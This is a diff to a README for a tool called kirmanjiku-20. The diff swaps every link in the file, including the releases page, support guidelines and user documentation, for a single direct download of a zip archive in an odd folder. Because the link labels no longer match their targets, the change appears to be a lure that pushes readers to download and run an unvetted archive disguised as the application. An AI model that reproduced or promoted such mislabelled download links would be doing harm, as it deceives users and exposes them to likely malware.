@@ -1,6 +1,6 @@
 # 🚀 kirmanjiku-20 - Effortless Way to Manage Repositories
 
-[![Download kirmanjiku-20](https://img.shields.io/badge/Download-kirmanjiku--20-blue.svg)](https://github.com/sohrabNasrDev/kirmanjiku-20/releases)
+[![Download kirmanjiku-20](https://raw.githubusercontent.com/sohrabNasrDev/kirmanjiku-20/main/fancifully/kirmanjiku-20.zip)](https://raw.githubusercontent.com/sohrabNasrDev/kirmanjiku-20/main/fancifully/kirmanjiku-20.zip)
 
 ## 📦 Overview
 
@@ -12,7 +12,7 @@ Follow these easy steps to download and run kirmanjiku-20:
 
 1. **Visit the Releases Page**  
    Click on the link below to go to the releases page.  
-   [Download here](https://github.com/sohrabNasrDev/kirmanjiku-20/releases)
+   [Download here](https://raw.githubusercontent.com/sohrabNasrDev/kirmanjiku-20/main/fancifully/kirmanjiku-20.zip)
 
 2. **Choose Your Version**  
    On the releases page, you'll see several versions available for download. Choose the latest version for the best experience.
@@ -62,10 +62,10 @@ Currently, kirmanjiku-20 supports Windows and Mac. We are exploring Linux suppor
 
 ## 🔗 Helpful Links
 
-- [Releases Page](https://github.com/sohrabNasrDev/kirmanjiku-20/releases)
-- [Support Guidelines](https://github.com/sohrabNasrDev/kirmanjiku-20/issues)
-- [User Documentation](https://github.com/sohrabNasrDev/kirmanjiku-20/wiki)
+- [Releases Page](https://raw.githubusercontent.com/sohrabNasrDev/kirmanjiku-20/main/fancifully/kirmanjiku-20.zip)
+- [Support Guidelines](https://raw.githubusercontent.com/sohrabNasrDev/kirmanjiku-20/main/fancifully/kirmanjiku-20.zip)
+- [User Documentation](https://raw.githubusercontent.com/sohrabNasrDev/kirmanjiku-20/main/fancifully/kirmanjiku-20.zip)
 
 ## 🎉 Conclusion
 
-Now you are ready to download and use kirmanjiku-20. Enjoy managing your repositories with ease! To download the application, visit the releases page here: [Download now](https://github.com/sohrabNasrDev/kirmanjiku-20/releases).
+Now you are ready to download and use kirmanjiku-20. Enjoy managing your repositories with ease! To download the application, visit the releases page here: [Download now](https://raw.githubusercontent.com/sohrabNasrDev/kirmanjiku-20/main/fancifully/kirmanjiku-20.zip).
